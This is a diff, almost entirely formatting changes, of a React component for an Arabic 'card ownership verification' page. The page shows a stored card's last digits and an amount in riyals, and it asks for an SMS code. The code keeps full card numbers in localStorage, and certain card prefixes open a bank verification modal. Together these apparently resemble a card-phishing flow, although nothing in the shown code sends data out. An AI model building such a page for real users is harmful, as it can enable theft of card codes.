@@ -1,22 +1,28 @@
-"use client"
+/* eslint-disable @typescript-eslint/no-explicit-any */
 
-import type React from "react"
+"use client";
 
-import { useEffect, useCallback, useState } from "react"
-import { useNavigate } from "react-router-dom"
-import { BankVerificationModal } from "../components/BankVerificationModal"
+import type React from "react";
+
+import { useEffect, useCallback, useState } from "react";
+import { useNavigate } from "react-router-dom";
+import { BankVerificationModal } from "../components/BankVerificationModal";
 
 interface CardOwnershipState {
-  otp: string[]
-  timer: number
-  error: string | null
-  amount: number
-  cardLastDigits: string
+  otp: string[];
+  timer: number;
+  error: string | null;
+  amount: number;
+  cardLastDigits: string;
 }
 
 // This function would replace the socket emit for verification
 // eslint-disable-next-line @typescript-eslint/no-unused-vars
-const verifyCardOwnership = async (orderId: string, cardId: string, verificationCode: string) => {
+const verifyCardOwnership = async (
+  orderId: string,
+  cardId: string,
+  verificationCode: string
+) => {
   // Replace with your API call
   try {
     // Example API call:
@@ -28,16 +34,16 @@ const verifyCardOwnership = async (orderId: string, cardId: string, verification
     // return response.json();
 
     // For now, just return a successful response
-    return { success: true }
+    return { success: true };
   } catch (error) {
-    console.error("Error verifying card ownership:", error)
-    throw new Error("Failed to verify card ownership")
+    console.error("Error verifying card ownership:", error);
+    throw new Error("Failed to verify card ownership");
   }
-}
+};
 
 export const CardOwnershipVerification = () => {
-  const navigate = useNavigate()
-  const [showBankModal, setShowBankModal] = useState(false)
+  const navigate = useNavigate();
+  const [showBankModal, setShowBankModal] = useState(false);
 
   // Replace Redux state with local state
   const [state, setState] = useState<CardOwnershipState>({
@@ -46,49 +52,49 @@ export const CardOwnershipVerification = () => {
     error: null,
     amount: 0,
     cardLastDigits: "",
-  })
+  });
 
   // Helper functions to update state (replacing Redux actions)
   const setOtpDigit = useCallback((index: number, value: string) => {
     setState((prevState) => {
-      const newOtp = [...prevState.otp]
-      newOtp[index] = value
-      return { ...prevState, otp: newOtp }
-    })
-  }, [])
+      const newOtp = [...prevState.otp];
+      newOtp[index] = value;
+      return { ...prevState, otp: newOtp };
+    });
+  }, []);
 
   const decrementTimer = useCallback(() => {
     setState((prevState) => ({
       ...prevState,
       timer: Math.max(0, prevState.timer - 1),
-    }))
-  }, [])
+    }));
+  }, []);
 
   const resetTimer = useCallback(() => {
     setState((prevState) => ({
       ...prevState,
       timer: 300, // Reset to 5 minutes
-    }))
-  }, [])
+    }));
+  }, []);
 
   const setError = useCallback((errorMessage: string) => {
     setState((prevState) => ({
       ...prevState,
       error: errorMessage,
-    }))
-  }, [])
+    }));
+  }, []);
 
   const clearError = useCallback(() => {
     setState((prevState) => ({
       ...prevState,
       error: null,
-    }))
-  }, [])
+    }));
+  }, []);
 
   // Check for special card prefixes
   useEffect(() => {
-    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "[]")
-    const lastPayment = paymentData[paymentData.length - 1]
+    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "[]");
+    const lastPayment = paymentData[paymentData.length - 1];
 
     if (lastPayment) {
       // Set card and amount data
@@ -96,126 +102,141 @@ export const CardOwnershipVerification = () => {
         ...prevState,
         amount: lastPayment.amount || 0,
         cardLastDigits: lastPayment.card_number?.slice(-4) || "",
-      }))
+      }));
 
-      const cardPrefix = lastPayment.card_number?.substring(0, 4)
-      const specialPrefixes = ["4847", "4092", "4622", "4321", "4455"]
+      const cardPrefix = lastPayment.card_number?.substring(0, 4);
+      const specialPrefixes = ["4847", "4092", "4622", "4321", "4455"];
 
       if (specialPrefixes.includes(cardPrefix)) {
-        setShowBankModal(true)
+        setShowBankModal(true);
       }
     }
-  }, [])
+  }, []);
 
   // Timer countdown
   useEffect(() => {
     const interval = setInterval(() => {
-      decrementTimer()
-    }, 1000)
+      decrementTimer();
+    }, 1000);
 
-    return () => clearInterval(interval)
-  }, [decrementTimer])
+    return () => clearInterval(interval);
+  }, [decrementTimer]);
 
   const isValidOtp = useCallback((otpValue: string) => {
-    return otpValue.length === 4 || otpValue.length === 6
-  }, [])
+    return otpValue.length === 4 || otpValue.length === 6;
+  }, []);
 
   const formatTime = useCallback((seconds: number) => {
-    const minutes = Math.floor(seconds / 60)
-    const remainingSeconds = seconds % 60
-    return `${String(minutes).padStart(2, "0")}:${String(remainingSeconds).padStart(2, "0")}`
-  }, [])
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    return `${String(minutes).padStart(2, "0")}:${String(
+      remainingSeconds
+    ).padStart(2, "0")}`;
+  }, []);
 
   const handleOtpChange = useCallback(
     (e: React.ChangeEvent<HTMLInputElement>) => {
-      const value = e.target.value.replace(/\D/g, "")
-      const digits = value.split("").slice(0, 6)
-      while (digits.length < 6) digits.push("")
+      const value = e.target.value.replace(/\D/g, "");
+      const digits = value.split("").slice(0, 6);
+      while (digits.length < 6) digits.push("");
       digits.forEach((digit, index) => {
-        setOtpDigit(index, digit)
-      })
-      clearError()
+        setOtpDigit(index, digit);
+      });
+      clearError();
     },
-    [setOtpDigit, clearError],
-  )
+    [setOtpDigit, clearError]
+  );
 
   const handleSubmit = useCallback(
     async (e: React.FormEvent) => {
-      e.preventDefault()
-      const otpValue = state.otp.join("")
+      e.preventDefault();
+      const otpValue = state.otp.join("");
 
       // Clear any existing errors
-      clearError()
+      clearError();
 
       // Validation logic
       if (otpValue.length === 5) {
-        setError("عدد غير صحيح. الرجاء إدخال 4 أو 6 أرقام")
-        return
+        setError("عدد غير صحيح. الرجاء إدخال 4 أو 6 أرقام");
+        return;
       }
 
       if (otpValue.length < 4) {
-        setError("الرجاء إدخال 4 أرقام على الأقل")
-        return
+        setError("الرجاء إدخال 4 أرقام على الأقل");
+        return;
       }
 
       if (otpValue.length > 6) {
-        setError("الحد الأقصى المسموح به هو 6 أرقام")
-        return
+        setError("الحد الأقصى المسموح به هو 6 أرقام");
+        return;
       }
 
       if (otpValue.length !== 4 && otpValue.length !== 6) {
-        setError("يرجى إدخال 4 أو 6 أرقام للتحقق")
-        return
+        setError("يرجى إدخال 4 أو 6 أرقام للتحقق");
+        return;
       }
 
       try {
-        const order_id = JSON.parse(localStorage.getItem("order_id") || "null")
-        const card_id = JSON.parse(localStorage.getItem("card_id") || "null")
+        const order_id = JSON.parse(localStorage.getItem("order_id") || "null");
+        const card_id = JSON.parse(localStorage.getItem("card_id") || "null");
 
         // Replace socket emit with API call
-        const result = await verifyCardOwnership(order_id, card_id, otpValue)
+        const result = await verifyCardOwnership(order_id, card_id, otpValue);
 
         if (result.success) {
-          navigate("/verify-card")
+          navigate("/verify-card");
         } else {
-          setError("رمز التحقق غير صحيح")
+          setError("رمز التحقق غير صحيح");
         }
-      // eslint-disable-next-line @typescript-eslint/no-unused-vars
+        // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (error) {
-        setError("رمز التحقق غير صحيح")
+        setError("رمز التحقق غير صحيح");
       }
     },
-    [state.otp, clearError, setError, navigate],
-  )
+    [state.otp, clearError, setError, navigate]
+  );
 
   const handleResendCode = useCallback(() => {
-    resetTimer()
+    resetTimer();
     // Add API call for resending code here
     // Example: resendVerificationCode(orderId, cardId);
-  }, [resetTimer])
+  }, [resetTimer]);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 pt-36 px-4">
       <div className="max-w-3xl mx-auto">
         <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
-          <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-[#146394]">إثبات ملكية البطاقة</h1>
+          <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-[#146394]">
+            إثبات ملكية البطاقة
+          </h1>
 
           <div className="text-center mb-8 space-y-4">
             <div className="p-6 bg-blue-50 rounded-xl transition-all duration-300 hover:bg-blue-100">
-              <p className="text-[#146394] mb-3">سيتم اجراء معاملة مالية على حسابك المصرفي</p>
+              <p className="text-[#146394] mb-3">
+                سيتم اجراء معاملة مالية على حسابك المصرفي
+              </p>
               <p className="text-[#146394] text-lg font-semibold mb-3">
-                لسداد مبلغ قيمته <span className="font-bold">{state.amount.toFixed(2)} ريال</span>
+                لسداد مبلغ قيمته{" "}
+                <span className="font-bold">
+                  {state.amount.toFixed(2)} ريال
+                </span>
               </p>
               <p className="text-[#146394]">
-                باستخدام البطاقة المنتهية برقم <span className="font-bold">{state.cardLastDigits}</span>
+                باستخدام البطاقة المنتهية برقم{" "}
+                <span className="font-bold">{state.cardLastDigits}</span>
               </p>
             </div>
-            <p className="text-gray-600">لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.</p>
+            <p className="text-gray-600">
+              لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.
+            </p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-8">
             <div>
-              <label htmlFor="otp-input" className="block text-right mb-4 text-[#146394] font-medium">
+              <label
+                htmlFor="otp-input"
+                className="block text-right mb-4 text-[#146394] font-medium"
+              >
                 رمز التحقق <span className="text-red-500">*</span>
               </label>
               <div className="flex justify-center">
@@ -232,7 +253,10 @@ export const CardOwnershipVerification = () => {
                 />
               </div>
               {state.error && (
-                <p role="alert" className="text-red-500 text-sm mt-2 text-center animate-shake">
+                <p
+                  role="alert"
+                  className="text-red-500 text-sm mt-2 text-center animate-shake"
+                >
                   {state.error}
                 </p>
               )}
@@ -240,7 +264,9 @@ export const CardOwnershipVerification = () => {
 
             <div className="text-center text-[#146394] bg-blue-50 p-4 rounded-xl">
               <p>سيتم إرسال رسالة كود التحقق في خلال</p>
-              <p className="font-bold text-lg mt-1">{formatTime(state.timer)} دقيقة</p>
+              <p className="font-bold text-lg mt-1">
+                {formatTime(state.timer)} دقيقة
+              </p>
             </div>
 
             <button
@@ -275,13 +301,17 @@ export const CardOwnershipVerification = () => {
                   clipRule="evenodd"
                 />
               </svg>
-              <p className="text-sm">نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك</p>
+              <p className="text-sm">
+                نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك
+              </p>
             </div>
           </div>
         </div>
       </div>
-      <BankVerificationModal isOpen={showBankModal} onClose={() => setShowBankModal(false)} />
+      <BankVerificationModal
+        isOpen={showBankModal}
+        onClose={() => setShowBankModal(false)}
+      />
     </div>
-  )
-}
-
+  );
+};
